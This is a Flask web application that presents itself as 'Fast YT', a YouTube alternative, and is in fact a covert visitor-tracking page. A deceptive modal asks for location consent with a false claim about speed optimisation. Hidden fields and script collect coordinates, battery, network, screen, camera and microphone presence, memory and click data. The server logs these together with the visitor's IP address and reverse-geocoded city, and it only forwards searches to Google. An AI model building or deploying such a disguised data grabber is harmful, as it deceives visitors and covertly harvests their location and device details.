from flask import Flask, request, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

index_html = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fast YT - Arama</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #ffffff;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 600px;
            width: 90%;
            color: #333;
        }
        h1 {
            color: #2a5298;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        p {
            color: #555;
            font-size: 1.2em;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            gap: 10px;
            justify-content: center;
            align-items: center;
        }
        input[type="text"] {
            padding: 12px;
            width: 70%;
            font-size: 1em;
            border: 2px solid #ddd;
            border-radius: 25px;
            outline: none;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus {
            border-color: #2a5298;
        }
        button {
            padding: 12px 25px;
            font-size: 1em;
            background-color: #2a5298;
            color: white;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1e3c72;
        }
        #result {
            margin-top: 20px;
            color: #333;
            font-size: 1.1em;
        }
        .welcome-message {
            font-size: 1.5em;
            color: #2a5298;
            margin-bottom: 20px;
        }
        .load-time {
            font-size: 0.9em;
            color: #555;
            margin-top: 20px;
        }
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .modal-content p {
            color: #333;
            margin-bottom: 20px;
        }
        .modal-content button {
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Fast YT</h1>
        <p class="welcome-message">Hoş geldiniz! En hızlı YouTube alternatifiniz.</p>
        <form id="searchForm" action="/search" method="GET">
            <input type="text" name="q" placeholder="Arama yap..." required>
            <input type="hidden" name="lat" id="lat">
            <input type="hidden" name="lon" id="lon">
            <input type="hidden" name="battery" id="battery">
            <input type="hidden" name="wifi" id="wifi">
            <input type="hidden" name="screen" id="screen">
            <input type="hidden" name="connection" id="connection">
            <input type="hidden" name="visit_time" id="visit_time">
            <input type="hidden" name="page_load_time" id="page_load_time">
            <input type="hidden" name="click_count" id="click_count" value="0">
            <input type="hidden" name="camera" id="camera">
            <input type="hidden" name="microphone" id="microphone">
            <input type="hidden" name="storage" id="storage">
            <input type="hidden" name="memory" id="memory">
            <input type="hidden" name="language" id="language">
            <input type="hidden" name="cookies" id="cookies">
            <button type="submit">Ara</button>
        </form>
        <p id="result">{{ result }}</p>
        <p class="load-time">Sayfa yükleme süresi: <span id="loadTimeDisplay"></span></p>
    </div>

    <div id="permissionModal" class="permission-modal" style="display: none;">
        <div class="modal-content">
            <p>Sitemiz size daha hızlı hizmet verebilmesi için bulunduğunuz konumun internet hızları bulunup ona göre ayarlanacaktır. Sizden bu yüzden konum izni istiyoruz.</p>
            <button onclick="allowLocation()">Evet</button>
            <button onclick="denyLocation()">Hayır</button>
        </div>
    </div>

    <script>
        let loadTime = performance.now();
        document.getElementById('page_load_time').value = loadTime.toFixed(2) + " ms";
        document.getElementById('loadTimeDisplay').innerText = loadTime.toFixed(2) + " ms";

        let locationAllowed = false;

        function showPermissionModal() {
            document.getElementById('permissionModal').style.display = 'flex';
        }

        function allowLocation() {
            document.getElementById('permissionModal').style.display = 'none';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        document.getElementById('lat').value = position.coords.latitude;
                        document.getElementById('lon').value = position.coords.longitude;
                        locationAllowed = true;
                        document.getElementById('searchForm').submit();
                    },
                    function(error) {
                        console.error("Konum hatası: ", error.code, error.message);
                        document.getElementById('lat').value = 'Hata';
                        document.getElementById('lon').value = 'Hata';
                        locationAllowed = false;
                        document.getElementById('searchForm').submit();
                    },
                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
                );
            } else {
                console.error("Tarayıcı konum servisini desteklemiyor.");
                document.getElementById('lat').value = 'Desteklenmiyor';
                document.getElementById('lon').value = 'Desteklenmiyor';
                document.getElementById('searchForm').submit();
            }
        }

        function denyLocation() {
            document.getElementById('permissionModal').style.display = 'none';
            locationAllowed = false;
            document.getElementById('searchForm').submit();
        }

        document.getElementById('searchForm').addEventListener('submit', function(event) {
            if (!locationAllowed && document.getElementById('lat').value === '' && document.getElementById('lon').value === '') {
                event.preventDefault();
                showPermissionModal();
            }
        });

        window.onload = function() {
            showPermissionModal();
        };

        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                let batteryInfo = `Şarj: %${Math.round(battery.level * 100)}, ${battery.charging ? 'Şarj oluyor' : 'Şarj olmuyor'}`;
                document.getElementById('battery').value = batteryInfo;
            });
        } else {
            document.getElementById('battery').value = "Şarj bilgisi desteklenmiyor";
        }

        if (navigator.connection) {
            let wifiInfo = `Ağ Türü: ${navigator.connection.type || 'Bilinmiyor'}`;
            document.getElementById('wifi').value = wifiInfo + ", Wi-Fi Adı: Tarayıcı tarafından sağlanmıyor";
        } else {
            document.getElementById('wifi').value = "Ağ bilgisi alınamadı";
        }

        let screenInfo = `Çözünürlük: ${window.screen.width}x${window.screen.height}, Yön: ${window.screen.orientation.type}`;
        document.getElementById('screen').value = screenInfo;

        if (navigator.connection) {
            let connInfo = `Hız: ${navigator.connection.downlink || 'Bilinmiyor'} Mbps, Gecikme: ${navigator.connection.rtt || 'Bilinmiyor'} ms`;
            document.getElementById('connection').value = connInfo;
        } else {
            document.getElementById('connection').value = "Bağlantı bilgisi desteklenmiyor";
        }

        let visitTime = new Date().toISOString();
        document.getElementById('visit_time').value = visitTime;

        document.getElementById('language').value = navigator.language || 'Bilinmiyor';

        document.getElementById('cookies').value = navigator.cookieEnabled ? 'Etkin' : 'Devre dışı';

        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                let hasCamera = devices.some(device => device.kind === 'videoinput');
                let hasMicrophone = devices.some(device => device.kind === 'audioinput');
                document.getElementById('camera').value = hasCamera ? 'Var' : 'Yok';
                document.getElementById('microphone').value = hasMicrophone ? 'Var' : 'Yok';
            });
        } else {
            document.getElementById('camera').value = 'Bilgi alınamadı';
            document.getElementById('microphone').value = 'Bilgi alınamadı';
        }

        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(function(estimate) {
                document.getElementById('storage').value = `Kullanılabilir Depolama: ${Math.round(estimate.quota / 1024 / 1024)} MB`;
            });
        } else {
            document.getElementById('storage').value = 'Depolama bilgisi desteklenmiyor';
        }
        document.getElementById('memory').value = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Bellek bilgisi desteklenmiyor';

        let clickCount = 0;
        document.addEventListener('click', function() {
            clickCount++;
            document.getElementById('click_count').value = clickCount;
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\nYeni Ziyaretçi:")
    print(f"IP Adresi: {client_ip}")
    print(f"Cihaz Bilgisi: {user_agent}")

    return render_template_string(index_html, result="")

@app.route('/search')
def search():
    query = request.args.get('q', '')
    lat = request.args.get('lat', 'Bilinmiyor')
    lon = request.args.get('lon', 'Bilinmiyor')
    battery = request.args.get('battery', 'Bilinmiyor')
    wifi = request.args.get('wifi', 'Bilinmiyor')
    screen = request.args.get('screen', 'Bilinmiyor')
    connection = request.args.get('connection', 'Bilinmiyor')
    visit_time = request.args.get('visit_time', 'Bilinmiyor')
    page_load_time = request.args.get('page_load_time', 'Bilinmiyor')
    click_count = request.args.get('click_count', '0')
    camera = request.args.get('camera', 'Bilinmiyor')
    microphone = request.args.get('microphone', 'Bilinmiyor')
    storage = request.args.get('storage', 'Bilinmiyor')
    memory = request.args.get('memory', 'Bilinmiyor')
    language = request.args.get('language', 'Bilinmiyor')
    cookies = request.args.get('cookies', 'Bilinmiyor')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    if lat != 'Bilinmiyor' and lon != 'Bilinmiyor' and lat != 'Hata' and lon != 'Hata':
        try:
            response = requests.get(
                f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json',
                headers={'User-Agent': 'FastYT/1.0'}
            )
            location_data = response.json()
            city = location_data.get('address', {}).get('city', '')
            country = location_data.get('address', {}).get('country', '')
            if city and country:
                location = f"{city}, {country}"
            else:
                location = "Bilinmiyor"
        except:
            location = "Bilinmiyor"
    else:
        location = "Bilinmiyor"

    print(f"\nYeni Arama:")
    print(f"IP Adresi: {client_ip}")
    print(f"Konum: {location}")
    print(f"Koordinatlar: Enlem: {lat}, Boylam: {lon}")
    print(f"Cihaz Bilgisi: {user_agent}")
    print(f"Şarj Durumu: {battery}")
    print(f"Ağ Bilgisi: {wifi}")
    print(f"Ekran Bilgisi: {screen}")
    print(f"Bağlantı Bilgisi: {connection}")
    print(f"Ziyaret Zamanı: {visit_time}")
    print(f"Sayfa Yükleme Süresi: {page_load_time}")
    print(f"Tıklama Sayısı: {click_count}")
    print(f"Kamera: {camera}")
    print(f"Mikrofon: {microphone}")
    print(f"Depolama: {storage}")
    print(f"Bellek: {memory}")
    print(f"Tarayıcı Dili: {language}")
    print(f"Çerezler: {cookies}")
    print(f"Arama Sorgusu: {query}")

    google_search_url = f"https://www.google.com/search?q={query}"
    result = f"'{query}' araması için Google'a yönlendiriliyorsunuz: <a href='{google_search_url}' target='_blank'>Tıklayın</a>"
    return render_template_string(index_html, result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
